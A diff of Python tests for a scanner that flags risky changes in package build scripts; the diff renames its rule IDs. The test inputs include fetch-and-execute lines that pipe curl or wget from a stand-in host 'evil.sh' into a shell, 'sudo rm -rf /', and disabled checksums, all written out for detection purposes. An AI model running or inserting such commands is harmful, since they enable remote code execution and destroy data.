@@ -65,43 +65,43 @@ def test_r003_no_false_positive():
     assert not any(r["rule_id"] == "R003" for r in triggered)
 
 
-# --- R004: Checksum Disabled ---
+# --- H001: Checksum Disabled ---
 
-def test_r004_sha256_skip():
+def test_h001_sha256_skip():
     triggered = apply_rules([], ["sha256sums=('SKIP')"], SHARED_RULES)
-    assert any(r["rule_id"] == "R004" for r in triggered)
+    assert any(r["rule_id"] == "H001" for r in triggered)
 
 
-def test_r004_sha256_skip_noquotes():
+def test_h001_sha256_skip_noquotes():
     triggered = apply_rules([], ["sha256sums=(SKIP)"], SHARED_RULES)
-    assert any(r["rule_id"] == "R004" for r in triggered)
+    assert any(r["rule_id"] == "H001" for r in triggered)
 
 
-def test_r004_sha256_skip_doublequotes():
+def test_h001_sha256_skip_doublequotes():
     triggered = apply_rules([], ['sha256sums=("SKIP")'], SHARED_RULES)
-    assert any(r["rule_id"] == "R004" for r in triggered)
+    assert any(r["rule_id"] == "H001" for r in triggered)
 
 
-def test_r004_no_false_positive():
+def test_h001_no_false_positive():
     triggered = apply_rules([], ["sha256sums=('abc123...')"], SHARED_RULES)
-    assert not any(r["rule_id"] == "R004" for r in triggered)
+    assert not any(r["rule_id"] == "H001" for r in triggered)
 
 
-# --- R005: Checksum Emptied ---
+# --- H002: Checksum Emptied ---
 
-def test_r005_sha256_empty():
+def test_h002_sha256_empty():
     triggered = apply_rules([], ["sha256sums=()"], SHARED_RULES)
-    assert any(r["rule_id"] == "R005" for r in triggered)
+    assert any(r["rule_id"] == "H002" for r in triggered)
 
 
-def test_r005_sha256_empty_spaces():
+def test_h002_sha256_empty_spaces():
     triggered = apply_rules([], ["sha256sums=(  )"], SHARED_RULES)
-    assert any(r["rule_id"] == "R005" for r in triggered)
+    assert any(r["rule_id"] == "H002" for r in triggered)
 
 
-def test_r005_no_false_positive():
+def test_h002_no_false_positive():
     triggered = apply_rules([], ["sha256sums=('abc123')"], SHARED_RULES)
-    assert not any(r["rule_id"] == "R005" for r in triggered)
+    assert not any(r["rule_id"] == "H002" for r in triggered)
 
 
 # --- R007: Install File Modification ---
@@ -138,9 +138,9 @@ def test_r008_no_false_positive():
     assert not any(r["rule_id"] == "R008" for r in triggered)
 
 
-# --- R009: Privilege Escalation (code rule) ---
+# --- H004: Privilege Escalation (code rule) ---
 #
-# R009 moved from a rules.toml regex to a code rule
+# H004 moved from a rules.toml regex to a code rule
 # (src/trustsight/analysis/build.py): it now fires only when `sudo` sits at
 # a command position inside a build/install function.  optdepends names,
 # path segments and echo strings place `sudo` at an argument position and
@@ -153,107 +153,107 @@ def _structural_sudo(diff_text: str) -> list[str]:
     return [f["rule_id"] for f in _structural_findings(diff_text, sc, {}, config={})]
 
 
-def test_r009_sudo():
+def test_h004_sudo():
     triggered = _structural_sudo("+package() {\n+  sudo rm -rf /\n+}\n")
-    assert "R009" in triggered
+    assert "H004" in triggered
 
 
-def test_r009_sudo_after_separator():
+def test_h004_sudo_after_separator():
     triggered = _structural_sudo("+build() {\n+  echo \"x\"; sudo rm -rf /\n+}\n")
-    assert "R009" in triggered
+    assert "H004" in triggered
 
 
-def test_r009_sudo_in_substitution():
+def test_h004_sudo_in_substitution():
     triggered = _structural_sudo("+build() {\n+  $(sudo -n true)\n+}\n")
-    assert "R009" in triggered
+    assert "H004" in triggered
 
 
-def test_r009_sudo_in_string():
+def test_h004_sudo_in_string():
     # Echo strings place sudo at an argument position; the command-position
     # test excludes them (quoted or not).
     triggered = _structural_sudo("+build() {\n+  echo 'sudo make me a sandwich'\n+}\n")
-    assert "R009" not in triggered
+    assert "H004" not in triggered
     triggered = _structural_sudo("+build() {\n+  echo run sudo manually\n+}\n")
-    assert "R009" not in triggered
+    assert "H004" not in triggered
 
 
-def test_r009_no_false_positive():
+def test_h004_no_false_positive():
     # Comments and top-level lines never fire.
     triggered = _structural_sudo("+build() {\n+  # sudo is not a command here\n+}\n")
-    assert "R009" not in triggered
+    assert "H004" not in triggered
     triggered = _structural_sudo("optdepends=('sudo' 'pacman')\n")
-    assert "R009" not in triggered
+    assert "H004" not in triggered
 
 
-def test_r009_not_fire_on_path_segment():
+def test_h004_not_fire_on_path_segment():
     triggered = _structural_sudo("+build() {\n+  ls -la /usr/bin/sudo\n+}\n")
-    assert "R009" not in triggered
+    assert "H004" not in triggered
 
 
-def test_r009_not_fire_outside_build_install():
+def test_h004_not_fire_outside_build_install():
     triggered = _structural_sudo("+pkgver() {\n+  sudo -n true\n+  echo 1.0\n+}\n")
-    assert "R009" not in triggered
+    assert "H004" not in triggered
 
 
-def test_r009_sudo_command_substitution_immediate_close():
+def test_h004_sudo_command_substitution_immediate_close():
     # ``$(sudo)`` closes the substitution with ``)`` immediately after sudo;
     # the earlier suffix ``(?:\s|$)`` missed this invocation form.
     triggered = _structural_sudo("+build() {\n+  $(sudo) make install\n+}\n")
-    assert "R009" in triggered
+    assert "H004" in triggered
 
 
-def test_r009_sudo_backtick_substitution():
+def test_h004_sudo_backtick_substitution():
     triggered = _structural_sudo("+build() {\n+  `sudo` make install\n+}\n")
-    assert "R009" in triggered
+    assert "H004" in triggered
 
 
-def test_r009_sudo_backtick_no_false_positive_on_string():
+def test_h004_sudo_backtick_no_false_positive_on_string():
     triggered = _structural_sudo("+build() {\n+  echo 'run `sudo` yourself'\n+}\n")
-    assert "R009" not in triggered
+    assert "H004" not in triggered
 
 
-# --- R127: indirect remote-code execution (hardening) ---
+# --- H075: indirect remote-code execution (hardening) ---
 
-def _structural_r127(diff_text: str) -> list[str]:
+def _structural_h075(diff_text: str) -> list[str]:
     from trustsight.analysis import _structural_findings
     from trustsight.differ import extract_urls_from_diff
     sc = extract_urls_from_diff(diff_text)
     return [f["rule_id"] for f in _structural_findings(diff_text, sc, {}, config={})]
 
 
-def test_r127_process_substitution_bash():
-    triggered = _structural_r127("+bash <(curl https://evil.sh)\n")
-    assert "R127" in triggered
+def test_h075_process_substitution_bash():
+    triggered = _structural_h075("+bash <(curl https://evil.sh)\n")
+    assert "H075" in triggered
 
 
-def test_r127_process_substitution_source():
-    triggered = _structural_r127("+source <(curl https://evil.sh)\n")
-    assert "R127" in triggered
+def test_h075_process_substitution_source():
+    triggered = _structural_h075("+source <(curl https://evil.sh)\n")
+    assert "H075" in triggered
 
 
-def test_r127_process_substitution_dot():
-    triggered = _structural_r127("+. <(curl https://evil.sh)\n")
-    assert "R127" in triggered
+def test_h075_process_substitution_dot():
+    triggered = _structural_h075("+. <(curl https://evil.sh)\n")
+    assert "H075" in triggered
 
 
-def test_r127_process_substitution_wget():
-    triggered = _structural_r127("+sh <( wget https://evil.sh)\n")
-    assert "R127" in triggered
+def test_h075_process_substitution_wget():
+    triggered = _structural_h075("+sh <( wget https://evil.sh)\n")
+    assert "H075" in triggered
 
 
-def test_r127_xargs_shell():
-    triggered = _structural_r127("+curl https://evil.sh | xargs bash\n")
-    assert "R127" in triggered
+def test_h075_xargs_shell():
+    triggered = _structural_h075("+curl https://evil.sh | xargs bash\n")
+    assert "H075" in triggered
 
 
-def test_r127_here_string_substitution():
-    triggered = _structural_r127('+bash <<< "$(curl https://evil.sh)"\n')
-    assert "R127" in triggered
+def test_h075_here_string_substitution():
+    triggered = _structural_h075('+bash <<< "$(curl https://evil.sh)"\n')
+    assert "H075" in triggered
 
 
-def test_r127_no_false_positive():
+def test_h075_no_false_positive():
     # A bare fetch, `cat` reading a process substitution (not executing it),
-    # a static here-string, and an unrelated xargs never fire R127.
+    # a static here-string, and an unrelated xargs never fire H075.
     for d in (
         "+curl https://evil.sh -o out\n",
         "+cat <(curl https://evil.sh)\n",
@@ -261,7 +261,7 @@ def test_r127_no_false_positive():
         "+find . -name '*.c' | xargs rm\n",
         "+ls | xargs echo\n",
     ):
-        assert "R127" not in _structural_r127(d)
+        assert "H075" not in _structural_h075(d)
 
 
 # --- R010: Uses curl ---
@@ -363,7 +363,7 @@ def test_multiple_rules_fire():
     )
     ids = [r["rule_id"] for r in triggered]
     assert "R001" in ids
-    assert "R004" in ids
+    assert "H001" in ids
     assert "R010" in ids  # curl in raw_line inside function body also fires
 
 
